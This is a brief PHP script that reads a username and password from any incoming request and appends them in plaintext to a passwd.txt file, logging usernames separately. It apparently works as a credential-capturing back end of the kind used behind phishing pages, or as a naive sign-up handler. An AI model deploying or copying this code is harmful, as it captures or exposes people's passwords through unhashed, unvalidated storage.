<?php
session_start();
# get the incoming information
$user = $_REQUEST["user"];
$pass = $_REQUEST["pass"];

if ($fh = fopen("passwd.txt", "a")) {
	fwrite($fh, "$user:$pass \n");
	fclose($fh);
}
if ($fh = fopen("prev_users.txt", "a")) {
	fwrite($fh, "$user \n");
	fclose($fh);
}
?>